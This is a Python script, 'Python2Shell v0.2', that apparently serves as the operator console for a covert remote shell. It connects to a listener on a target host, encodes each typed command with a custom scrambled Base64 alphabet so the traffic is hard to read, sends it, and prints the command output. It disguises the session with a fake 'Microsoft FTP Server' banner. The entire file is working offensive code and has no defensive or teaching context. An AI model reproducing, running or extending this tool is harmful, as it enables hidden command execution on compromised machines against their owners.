#!/usr/bin/env python3

# Python2Shell v0.2 (LiquidSky)
import socket
import argparse
import sys

# Custom Base64 encoding function
CUSTOM_ALPHABET = "~!@#$%^&*()_+=-0987654321`:;'{jKlMnOpQrStUvWxYzaBcDeFgHi,.<>?[]}"
CUSTOM_ALPHABET_MAP = {char: idx for idx, char in enumerate(CUSTOM_ALPHABET)}

def custom_base64_encode(data: bytes) -> str:
    """Custom Base64 encoding"""
    binary_string = ''.join(f'{byte:08b}' for byte in data)
    chunks = [binary_string[i:i+6] for i in range(0, len(binary_string), 6)]
    padding = len(chunks[-1]) < 6
    if padding:
        chunks[-1] = chunks[-1].ljust(6, '0')
    encoded = ''.join(CUSTOM_ALPHABET[int(chunk, 2)] for chunk in chunks)
    if padding:
        encoded += '#'
    return encoded

def print_banner():
    print("220 Microsoft FTP Server on Windows NT\n")

def main():
    parser = argparse.ArgumentParser(
        description="Python2Shell v0.2 - Sends custom Base64 encoded commands to a listener",
        epilog="Example: python2shell.py -i 127.0.0.1 -p 446"
    )
    parser.add_argument("-i", "--ip", required=True, help="Target IP address of the listener")
    parser.add_argument("-p", "--port", type=int, required=True, help="Target port of the listener")
    args = parser.parse_args()

    # Connect to listener
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((args.ip, args.port))
        print_banner()
    except Exception as e:
        print(f"[!] Error connecting to server: {e}")
        sys.exit(1)

    while True:
        try:
            command = input(f"{args.ip}> ")

            if command.lower() in ['exit', 'quit']:
                encoded = custom_base64_encode(command.encode('utf-8'))
                s.send(encoded.encode('utf-8'))
                print("[*] Closing connection.")
                break

            encoded = custom_base64_encode(command.encode('utf-8'))
            print(f"[*] Sending Encoded Command: {encoded}")
            s.send(encoded.encode('utf-8'))

            response = s.recv(1024).decode('utf-8')
            print(f"[*] Command Output: {response}")

        except BrokenPipeError:
            print("[*] Server closed the connection. Exiting.")
            break
        except Exception as e:
            print(f"[!] Error: {e}")
            break

    s.close()

if __name__ == "__main__":
    main()
